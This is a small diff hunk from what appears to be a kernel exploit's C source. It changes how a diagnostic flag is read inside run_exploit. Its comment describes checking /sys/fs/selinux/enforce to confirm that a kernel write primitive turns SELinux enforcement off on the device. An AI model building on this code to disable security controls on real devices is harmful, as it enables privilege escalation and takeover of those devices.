@@ -327,7 +327,7 @@ int run_exploit(int argc, char **argv) {
    * getenforce before/after: a 1->0 flip proves the chain-walk dequeue store
    * actually executes on-device, isolating "walk doesn't write" from "wrong fops
    * target/method". Uses the /sys/fs/selinux/enforce channel (always reliable). */
-  int enforce_diag = env_flag("ENFORCING_WRITE_DIAG", 0);
+  int enforce_diag = enforcing_write_diag_enabled();
   char enf_before[32] = "?";
   if (enforce_diag) {
     read_first_line("/sys/fs/selinux/enforce", enf_before, sizeof(enf_before));
